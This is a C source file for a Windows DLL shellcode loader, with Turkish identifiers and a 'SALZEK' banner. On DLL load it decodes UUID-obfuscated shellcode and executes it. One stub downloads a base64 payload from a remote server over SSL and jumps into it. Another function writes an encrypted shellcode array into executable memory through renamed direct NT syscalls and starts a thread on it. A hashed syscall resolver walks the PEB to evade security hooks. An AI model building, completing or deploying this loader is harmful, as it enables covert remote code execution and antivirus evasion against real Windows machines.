#include "connect.h"
#include "Header.h"
#include "mylib.h"

#pragma section(".mrdata", read, execute)
#pragma comment(linker, "/SECTION:.mrdata,ERW")

#define RVA 0x6000
#define RVA2 0x8000
#define POOL_SIZE 20
#define BASE_ADDR 0x180000000

static char memory_pool[POOL_SIZE];
static size_t current_index = 0;

typedef struct {
    uint64_t low;
    uint32_t high;
} uint96_t;

void* my_memcpy(char* dest, const void* src, size_t n) {
    char* c_dest = (char*)dest;
    const char* c_src = (const char*)src;

    for (size_t i = 0; i < n; i++) {
        *c_dest++ = *c_src++;
    }

    return dest;
}

void* find_signature(const void* start, size_t size, int signature) {
    for (size_t i = 0; i < size; i++) {
        if (*((int*)((char*)start + i)) == signature) {
            char* p = (char*)start + i;

            while (1) {
                WORD funcsignature = *(WORD*)(p);

                if (0x8148 == funcsignature || 0x8348 == funcsignature) {
                    return p;
                }
                p -= 1;
            }
        }
    }
    return NULL;
}

char* decreaseEntropyDecoder(char* encodedPayload, int rate, int realPayloadSize) {
    HANDLE  heap = GetProcessHeap();

    // The most important thing is the string length of words!! Because, the program flow will be move according to that.
    int stringLenOfWord = 4;
    char* realPayload = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, realPayloadSize);
    char* begStr = realPayload;
    int copiedBytes = 0;

    while (1) {
        memcpy(realPayload, encodedPayload, rate);

        copiedBytes += rate;
        realPayload += rate;
        encodedPayload += stringLenOfWord + rate;

        if (copiedBytes == realPayloadSize) return begStr;
        else if (copiedBytes + rate > realPayloadSize) {
            memcpy(realPayload, encodedPayload, rate - (copiedBytes + rate - realPayloadSize));

            return begStr;
        }
    }
}

char* UUID_Deobfuscation(char* str, int payloadSize, int realPayloadSize) {
    HANDLE  heap = GetProcessHeap();
    char* realPayload = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, realPayloadSize);
    char* begStr = realPayload;

    int numberOfUUID = realPayloadSize / 22;

    int remainingBytes = realPayloadSize - (22 * numberOfUUID);

    uint32_t result_1 = 0;
    uint16_t result_2 = 0, result_3 = 0, result_4 = 0;
    uint96_t result_5 = { 0 };

    for (int i = 0; i < numberOfUUID; i++) {
        result_1 |= (*(uint32_t*)str & 0xFF000000) >> 24;
        result_1 |= (*(uint32_t*)str & 0x00FF0000) >> 8;
        result_1 |= (*(uint32_t*)str & 0x0000FF00) << 8;
        result_1 |= (*(uint32_t*)str & 0x000000FF) << 24;

        memcpy(realPayload, &result_1, sizeof result_1);
        str += sizeof result_1 + 1; // +1 FOR 0x2d (-)
        realPayload += 4;
        result_1 = 0;

        result_2 |= (*(uint16_t*)str & 0xFF00) >> 8;
        result_2 |= (*(uint16_t*)str & 0x00FF) << 8;

        memcpy(realPayload, &result_2, sizeof result_2);
        str += sizeof result_2 + 1; // +1 FOR 0x2d (-)
        realPayload += 2;
        result_2 = 0;

        result_3 |= (*(uint16_t*)str & 0xFF00) >> 8;
        result_3 |= (*(uint16_t*)str & 0x00FF) << 8;

        memcpy(realPayload, &result_3, sizeof result_3);
        str += sizeof result_3 + 1; // +1 FOR 0x2d (-)
        realPayload += 2;
        result_3 = 0;

        result_4 = *(uint16_t*)str;
        memcpy(realPayload, &result_4, sizeof result_4);
        str += sizeof result_4 + 1; // +1 FOR 0x2d (-)
        realPayload += 2;
        result_4 = 0;

        result_5.low = *(uint64_t*)str;
        memcpy(realPayload, &result_5, 8);
        str += 8;
        realPayload += 8;
        result_5.high = *(uint32_t*)str;
        memcpy(realPayload, &result_5.high, 4);
        str += 4;
        realPayload += 4;
        result_5.high = 0; result_5.low = 0;
    }

    if (remainingBytes) {
        int whichBlockInYou, bytesOfCount;

        if (remainingBytes <= 4) whichBlockInYou = 1;
        else if (remainingBytes > 4 && remainingBytes < 7) whichBlockInYou = 2;
        else if (remainingBytes > 6 && remainingBytes < 9) whichBlockInYou = 3;
        else if (remainingBytes > 8 && remainingBytes < 11) whichBlockInYou = 4;
        else if (remainingBytes > 10 && remainingBytes < 19) whichBlockInYou = 5;
        else whichBlockInYou = 6;


        switch (1)
        {
        case 1:
            result_1 |= (*(uint32_t*)str & 0xFF000000) >> 24;
            result_1 |= (*(uint32_t*)str & 0x00FF0000) >> 8;
            result_1 |= (*(uint32_t*)str & 0x0000FF00) << 8;
            result_1 |= (*(uint32_t*)str & 0x000000FF) << 24;

            if (whichBlockInYou == 1) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_1, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 4;
                memcpy(realPayload, &result_1, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount + 1; // +1 for (-)0x2d
            }
        case 2:
            result_2 |= (*(uint16_t*)str & 0xFF00) >> 8;
            result_2 |= (*(uint16_t*)str & 0x00FF) << 8;

            if (whichBlockInYou == 2) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_2, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 2;
                memcpy(realPayload, &result_2, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount + 1; // +1 for (-)0x2d
            }
        case 3:
            result_3 |= (*(uint16_t*)str & 0xFF00) >> 8;
            result_3 |= (*(uint16_t*)str & 0x00FF) << 8;

            if (whichBlockInYou == 3) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_3, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 2;
                memcpy(realPayload, &result_3, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount + 1; // +1 for (-)0x2d
            }
        case 4:
            result_4 = *(uint16_t*)str;

            if (whichBlockInYou == 4) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_4, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 2;
                memcpy(realPayload, &result_4, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount + 1; // +1 for (-)0x2d
            }
        case 5:
            result_5.low = *(uint64_t*)str;

            if (whichBlockInYou == 5) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_5.low, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 8;
                memcpy(realPayload, &result_5.low, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount; // +1 for (-)0x2d
            }

            result_5.high = *(uint32_t*)str;

            if (whichBlockInYou == 6) {
                bytesOfCount = (begStr + realPayloadSize) - realPayload;
                memcpy(realPayload, &result_5.high, bytesOfCount);

                return begStr;
            }
            else {
                bytesOfCount = 4;
                memcpy(realPayload, &result_5.low, bytesOfCount);
                realPayload += bytesOfCount;
                str += bytesOfCount; // +1 for (-)0x2d
            }
        default:
            break;
        }
    }

    return begStr;
}

__declspec(code_seg(".stub")) void xIkxJl() {
    volatile int signatureSpace = 0xABCDEFBA;
    int outputlengthdec, size = 15704;
    configure_SSL();
    initialize_socket();
    handle_dns_lookup();
    connect_server();
    connect_server_with_ssl();
    construct_http_request();
    fetch_data();
    cleanup_SSL_resources();
    closeSocket();
    char* encodeddata = extract_http_body_content();
    char* decodedpayload = base64_decode(encodeddata, size, &outputlengthdec);
    memcpy((char*)BASE_ADDR + RVA2, decodedpayload, outputlengthdec);
    char* addr = (char*)find_signature((char*)BASE_ADDR + RVA2, 0x2B84, 0xABCDEFBA);
    void (*fun_ptr)() = addr;
    ((void(*)())(*fun_ptr))();
    char* words2[] = {
                        "aahs", "aals", "aani", "aaru", "abac", "abay", "abas", "abba", "abbe", "abby",
                        "abbr", "abed", "abey", "abel", "abet", "abib", "abie", "abye", "abir", "abys",
                        "abit", "able", "ably", "abos", "abow", "abox", "abri", "absi", "abut", "acad",
                        "acca", "acce", "acct", "aced", "acer", "aces", "ache", "achy", "acid", "acyl",
                        "acis", "acle", "aclu", "acme", "acne", "acop", "acor", "acpt", "acre", "acta",
                        "actg", "acts", "actu", "acus", "adad", "adai", "aday", "adam", "adar", "adat",
                        "adaw", "adda", "addy", "addn", "addr", "adds", "addu", "aden", "adet", "adib",
                        "adin", "adit", "adjt", "admi", "adod", "adon", "ador", "ados", "adry", "advt",
                        "adze", "aeon", "aery", "aero", "aesc", "afar", "afer", "affa", "affy", "afft",
                        "afro", "agad", "agag", "agal", "agao", "agar", "agas", "agau", "agaz", "agba",
                        "agcy", "aged", "agee", "agen", "ager", "ages", "aget", "agha", "agib", "agin",
                        "agio", "agit", "agla", "agly", "agma", "agog", "agon", "agos", "agra", "agre",
                        "agst", "agua", "ague", "ahab", "ahey", "ahem", "ahet", "ahir" };
}

__declspec(dllexport) int main(HMODULE hModule) {
    char* shellcode_UUID_Deobfuscated = UUID_Deobfuscation((byte*)hModule + RVA, 0x1a00, 0x1600);
    memcpy((byte*)hModule + RVA, shellcode_UUID_Deobfuscated, 0x1600);
    char* addr = (char*)find_signature((char*)hModule + RVA, 0x1600, 0xABCDEFBA);
    void (*fun_ptr)() = addr;
    ((void(*)())(*fun_ptr))();
    return 0;
}

/*


  ██████  ▄▄▄       ██▓    ▒███████▒▓█████  ██ ▄█▀
▒██    ▒ ▒████▄    ▓██▒    ▒ ▒ ▒ ▄▀░▓█   ▀  ██▄█▒
░ ▓██▄   ▒██  ▀█▄  ▒██░    ░ ▒ ▄▀▒░ ▒███   ▓███▄░
  ▒   ██▒░██▄▄▄▄██ ▒██░      ▄▀▒   ░▒▓█  ▄ ▓██ █▄
▒██████▒▒ ▓█   ▓██▒░██████▒▒███████▒░▒████▒▒██▒ █▄
▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░▓  ░░▒▒ ▓░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒
░ ░▒  ░ ░  ▒   ▒▒ ░░ ░ ▒  ░░░▒ ▒ ░ ▒ ░ ░  ░░ ░▒ ▒░
░  ░  ░    ░   ▒     ░ ░   ░ ░ ░ ░ ░   ░   ░ ░░ ░
      ░        ░  ░    ░  ░  ░ ░       ░  ░░  ░
                           ░

*/

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:main(hModule);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

__declspec(code_seg(".mrdata")) void calistir() {
    volatile int signatureSpace = 0xABCDEFBA;
    uint32_t key[4] = { 0xabcd, 0xdef9, 0x21ac, 0x3adf };
    unsigned char b[] = { 0x26, 0xc2, 0x4d, 0x6f, 0x8f, 0x45, 0x2c, 0x97, 0xd9, 0xcc, 0x1f, 0x7b, 0x14, 0x8c, 0x79, 0x42, 0xb0, 0x60, 0xc8, 0x1e, 0xa8, 0xf8, 0x6a, 0x79, 0x57, 0x66, 0x4d, 0x44, 0x84, 0xc9, 0x0d, 0xa8, 0xf2, 0x4a, 0xb6, 0x21, 0xd6, 0xb9, 0xec, 0xb5, 0x60, 0x5a, 0x7f, 0x8b, 0x34, 0xa8, 0xa7, 0x6c, 0xcb, 0x10, 0x45, 0x1a, 0x58, 0x67, 0x2a, 0x9e, 0xd7, 0x10, 0x7c, 0xdb, 0x40, 0xb7, 0x6e, 0xf3, 0xcc, 0x99, 0x42, 0x18, 0xca, 0x11, 0xeb, 0x2d, 0x5b, 0x4a, 0x0b, 0x6a, 0x58, 0x37, 0xac, 0x2e, 0x41, 0x3a, 0xf1, 0x81, 0xa7, 0x23, 0x60, 0xcf, 0x0e, 0x0d, 0xfc, 0xcb, 0xbe, 0x37, 0xe0, 0x21, 0x77, 0x25, 0x7d, 0x39, 0x42, 0x7d, 0xa8, 0x51, 0x9a, 0x2c, 0x43, 0x96, 0x0d, 0xbb, 0x1b, 0x1b, 0x26, 0x73, 0x9b, 0x01, 0x76, 0xc1, 0x91, 0x49, 0xeb, 0x2d, 0xdb, 0xf3, 0xac, 0xe8, 0xce, 0xdf, 0x67, 0x1c, 0xd1, 0x29, 0xda, 0x34, 0x3d, 0xf1, 0xb5, 0x89, 0x36, 0x0f, 0xe5, 0xde, 0x0c, 0x4a, 0x8d, 0x37, 0x77, 0xa1, 0x66, 0xec, 0x90, 0x90, 0xdb, 0x89, 0x41, 0xa0, 0x1c, 0xcd, 0x6b, 0x7a, 0xeb, 0xe4, 0x2c, 0x0b, 0x3d, 0x24, 0x4a, 0x54, 0x60, 0xee, 0xb4, 0xd9, 0x74, 0xad, 0xf0, 0x33, 0xe2, 0x43, 0x90, 0x0f, 0x61, 0xbf, 0xec, 0x12, 0x7d, 0xc7, 0xf4, 0x91, 0xdf, 0xd8, 0xa0, 0x91, 0xcd, 0x71, 0x54, 0xe2, 0xaa, 0xb2, 0xd9, 0xf0, 0x53, 0xb6, 0x06, 0x2b, 0xde, 0x74, 0xd4, 0x3c, 0xb2, 0x0e, 0xe5, 0x63, 0x17, 0x41, 0x59, 0x65, 0x22, 0x6d, 0x4b, 0x47, 0x28, 0x53, 0xf1, 0x5b, 0x3d, 0xca, 0x66, 0x34, 0xa3, 0xc2, 0xf3, 0x0e, 0x4f, 0x27, 0x6f, 0x31, 0x35, 0x97, 0xd6, 0x97, 0xdc, 0x04, 0xed, 0x51, 0x56, 0xce, 0x09, 0x79, 0xae, 0xe8, 0x4b, 0xf7, 0x6b, 0x9c, 0x6a, 0xa2, 0xaa, 0x25, 0x70, 0x45, 0x38, 0x05, 0x32, 0xaf, 0xe6, 0x0d, 0x8d, 0x00, 0x15, 0x75, 0x43, 0xd3, 0x3e, 0x5f, 0x2b, 0xa9, 0xab, 0xa7, 0x75, 0x7d, 0x22, 0xd5, 0x42, 0x4f, 0x4f, 0x9a, 0xd4, 0x0e, 0x8d, 0x40, 0x4f, 0x97, 0x52, 0x01, 0xf8, 0x98, 0x2b, 0xe4, 0x2f, 0x08, 0x0b, 0x9e, 0xd1, 0x25, 0xdb, 0x22, 0xa1, 0xe7, 0x4e, 0x8a, 0x81, 0xd6, 0xb3, 0x6c, 0x89, 0x54, 0x09, 0x8e, 0x38, 0x26, 0x2f, 0xba, 0x14, 0xe0, 0xde, 0x35, 0x01, 0x94, 0x48, 0x4a, 0xc4, 0xcd, 0x8c, 0x90, 0xca, 0x30, 0x28, 0x24, 0x0c, 0x7c, 0xd8, 0xdb, 0x12, 0x96, 0xc0, 0xfe, 0x77, 0x59, 0x49, 0x9e, 0xac, 0x78, 0x7f, 0xce, 0x62, 0x3f, 0xe2, 0x90, 0x39, 0x44, 0x97, 0x9f, 0x07, 0x9b, 0x0c, 0x32, 0xc5, 0x51, 0x41, 0xf3, 0x9d, 0xd8, 0x0a, 0x44, 0x69, 0x61, 0x90, 0x81, 0x68, 0xfb, 0xf8, 0x46, 0x21, 0x47, 0xba, 0x54, 0x5c, 0xd5, 0x76, 0x63, 0x13, 0xc5, 0x54, 0x47, 0xf8, 0xf5, 0x5c, 0x7f, 0xf6, 0xda, 0x0c, 0x3a, 0xe1, 0x7c, 0xfd, 0xaf, 0x1b, 0x01, 0x91, 0x3f, 0x25, 0x06, 0x2b, 0x08, 0x9e, 0x1e, 0xd2, 0x85, 0xcb, 0x4b, 0x9f, 0xe0, 0xa1, 0x9e, 0x84, 0xb4, 0x7d, 0xa8, 0xf8, 0x5b, 0x7f, 0xe6, 0x0f, 0x55, 0xef, 0xc3, 0xa5, 0xd7, 0x42, 0xf2, 0xaf, 0x53, 0xfe, 0x73, 0x2e, 0x25, 0xf3, 0x17, 0x33, 0x59, 0xff, 0xea, 0xff, 0xa8, 0xa5, 0xf2, 0xa5, 0x32, 0xd1, 0x33, 0x9d, 0xa3, 0x86, 0xd1 };
    HANDLE tripctrl, hThread = NULL;
    LPVOID lpAllocationStart = NULL;
    SIZE_T szAllocationSize = sizeof(b);
    unsigned int ze3hirr_len = sizeof(b);
    BOOL trctrl;
    DWORD tresgiay4rl4r = 0;
    NtBellekAyir(0xffffffffffffffff, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtHafizayaYaz(0xffffffffffffffff, lpAllocationStart, (PVOID)b, ze3hirr_len, NULL);
    coz(lpAllocationStart, key, sizeof(b));
    NtIpOlustur(&hThread, GENERIC_EXECUTE, NULL, 0xffffffffffffffff, lpAllocationStart, lpAllocationStart, FALSE, NULL, NULL, NULL, NULL);

    WSAStartup(MAKEWORD(2, 2), &d);

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    struct addrinfo* bind_address;
    getaddrinfo(0, "8080", &hints, &bind_address);
    SOCKET socket_listen;
    socket_listen = socket(bind_address->ai_family,
        bind_address->ai_socktype, bind_address->ai_protocol);
    listen(socket_listen, 1);
}

__declspec(code_seg(".mrdata")) int my_strncmp(const char* s1, const char* s2, size_t n) {
    while (n) {
        if (*s1 != *s2 || *s1 == '\0' || *s2 == '\0') {
            return *(unsigned char*)s1 - *(unsigned char*)s2;
        }
        s1++;
        s2++;
        n--;
    }
    return 0;
}

__declspec(code_seg(".mrdata")) void* my_malloc(size_t size) {
    if (current_index + size > POOL_SIZE) {
        return NULL; // Bellek yetersiz
    }
    void* ptr = &memory_pool[current_index];
    current_index += size;
    return ptr;
}

__declspec(code_seg(".mrdata")) void reverse_string(char* str) {
    int length = strlen(str);
    int start = 0;
    int end = length - 1;
    while (start < end) {
        char temp = str[start];
        str[start] = str[end];
        str[end] = temp;
        start++;
        end--;
    }
}

__declspec(allocate(".mrdata")) SALZEK_CAGRI_LIST SALZEK_CAGRIList = { 0, 1 };

__declspec(code_seg(".mrdata")) DWORD SALZEK_HashCAGRI(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SALZEK_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + SALZEK_ROR8(Hash);
    }

    return Hash;
}

__declspec(code_seg(".mrdata")) BOOL SALZEK_PopulateCAGRIList(void)
{

    if (SALZEK_CAGRIList.Count) return TRUE;

#if defined(_WIN64)
    PSALZEK_BEP BEP = (PSALZEK_BEP)__readgsqword(0x60);
#else
    PSALZEK_BEP BEP = (PSALZEK_BEP)__readfsdword(0x30);
#endif
    PSALZEK_BEP_DLR_DATA DLR = BEP->DLR;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;


    PSALZEK_DLR_DATA_TABLE_ENTRY DLREntry;
    for (DLREntry = (PSALZEK_DLR_DATA_TABLE_ENTRY)DLR->Reserved2[1]; DLREntry->DllBase != NULL; DLREntry = (PSALZEK_DLR_DATA_TABLE_ENTRY)DLREntry->Reserved1[0])
    {
        DllBase = DLREntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SALZEK_SASA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SALZEK_SASA2VA(ULONG_PTR, DllBase, VirtualAddress);


        PCHAR DllName = SALZEK_SASA2VA(PCHAR, DllBase, ExportDirectory->Name);

        SIZE_T DLLNameSize = strlen(DllName);

        PCHAR FakeDllName = (PCHAR)my_malloc(DLLNameSize + 1);

        my_memcpy(FakeDllName, DllName, DLLNameSize);

        FakeDllName[DLLNameSize] = '\0';

        reverse_string(FakeDllName); // lld.lldtn

        char ctrl = 0, realCtrl = 0;

        for (int i = 0; i < strlen(DllName); i++)
        { //mme/mmeuo
            switch (++*FakeDllName)
            {
            case 'm':
                ctrl++;
                FakeDllName += 2;
                break;
            case 'e':
                ctrl++;
                FakeDllName++;
                break;
            case '/':
                ctrl++;
                FakeDllName++;
                for (int i = 0; i < 5; i++) {
                    *FakeDllName = ++ * FakeDllName;
                    FakeDllName++;
                }
                FakeDllName = FakeDllName - 5;
                if (!my_strncmp(FakeDllName, "mmeuo", 5) && ctrl == 3) realCtrl = 1;
                break;
            }
        }

        if (realCtrl) break;
        else continue;

    }

    if (!ExportDirectory) return FALSE;



    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SALZEK_SASA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SALZEK_SASA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SALZEK_SASA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);


    DWORD i = 0;
    PSALZEK_CAGRI_ENTRY Entries = SALZEK_CAGRIList.Entries;
    do
    {
        PCHAR FName = SALZEK_SASA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        PCHAR FakeFName = FName;

        if (*(unsigned short*)FakeFName == *(unsigned short*)"Zwxyzabcd")
        {

            Entries[i].Hash = SALZEK_HashCAGRI(FakeFName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SALZEK_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);


    SALZEK_CAGRIList.Count = i;


    for (i = 0; i < SALZEK_CAGRIList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SALZEK_CAGRIList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {

                SALZEK_CAGRI_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

__declspec(code_seg(".mrdata")) EXTERN_C DWORD SALZEK_GetCAGRINumber(DWORD FunctionHash)
{

    if (!SALZEK_PopulateCAGRIList()) return -1;

    for (DWORD i = 0; i < SALZEK_CAGRIList.Count; i++)
    {
        if (FunctionHash == SALZEK_CAGRIList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}
